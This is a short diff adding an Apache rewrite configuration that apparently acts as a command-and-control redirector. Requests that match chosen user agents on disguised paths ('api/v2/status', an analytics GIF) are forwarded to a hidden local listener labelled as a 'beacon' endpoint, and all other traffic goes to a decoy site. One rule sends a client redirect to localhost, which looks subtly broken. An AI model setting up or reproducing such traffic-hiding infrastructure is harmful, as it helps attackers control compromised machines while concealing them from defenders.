@@ -1,0 +1,12 @@
+RewriteEngine On
+
+# Profile: alpha - API beacon
+RewriteCond %{HTTP_USER_AGENT} "Chrome" [NC]
+RewriteRule ^api/v2/status$ http://127.0.0.1:50050%{REQUEST_URI} [R=302,L]
+
+# Profile: bravo - CDN beacon
+RewriteCond %{HTTP_USER_AGENT} "Googlebot" [NC]
+RewriteRule ^static/assets/analytics\.gif$ http://127.0.0.1:50050%{REQUEST_URI} [P,L]
+
+# Catch-all redirect to decoy
+RewriteRule ^(.*)$ https://www.example.com/$1 [R=302,L]
